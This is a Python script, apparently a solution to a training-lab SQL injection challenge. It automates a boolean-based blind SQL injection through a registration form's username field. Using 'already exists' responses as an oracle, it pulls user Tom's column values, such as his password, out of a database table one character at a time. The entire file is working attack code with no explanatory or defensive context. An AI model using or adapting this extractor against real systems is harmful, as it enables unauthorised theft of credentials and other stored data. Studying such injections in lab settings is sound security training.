import json
import requests

def extract_tom_details(cookie, server_url, table_name, columns):
    """
    Extracts details for the user 'Tom' from a specific table.

    Args:
        cookie (str): Session cookie for authentication.
        server_url (str): The URL of the server to target.
        table_name (str): The table to query.
        columns (list): List of column names in the table.

    Returns:
        dict: A dictionary with column names as keys and extracted values as data.
    """
    headers = {
        'Cookie': cookie,
    }

    def extract_value(column_name, char_index):
        value = ''
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789!@#$%^&*()'
        alphabet_index = 0

        while True:
            payload = "' OR (SELECT substring({}, {}, 1) FROM {} WHERE USERID = 'tom') = '{}' --".format(
                column_name, char_index, table_name, alphabet[alphabet_index]
            )
            data = {
                'username_reg': payload,
                'email_reg': 'a@a',
                'password_reg': 'a',
                'confirm_password_reg': 'a'
            }
            r = requests.put(f'{server_url}/SqlInjectionAdvanced/challenge', headers=headers, data=data)

            try:
                response = json.loads(r.text)
            except:
                return None

            if "already exists" not in response.get('feedback', ''):
                alphabet_index += 1
                if alphabet_index >= len(alphabet):
                    break
            else:
                value += alphabet[alphabet_index]
                alphabet_index = 0
                char_index += 1

        return value

    user_data = {}
    for column in columns:
        user_data[column] = extract_value(column, 1) or 'NULL'

    return user_data
